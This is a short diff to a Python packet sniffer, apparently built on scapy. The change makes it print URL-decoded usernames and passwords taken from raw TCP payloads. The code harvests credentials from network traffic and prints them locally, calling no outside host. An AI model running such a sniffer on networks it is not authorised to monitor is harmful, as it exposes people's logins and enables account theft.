@@ -34,7 +34,13 @@ def get_login_pass(body):
 def pkt_parser(packet):
     if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
         body = str(packet[TCP].payload)
-        username, password = get_login_pass(body)
+        user_pass = get_login_pass(body)
+        if user_pass != None:
+            print(packet[TCP].payload)
+            print(parse.unquote(user_pass[0]))
+            print(parse.unquote(user_pass[1]))
+    else:
+        pass
 
 
 try:
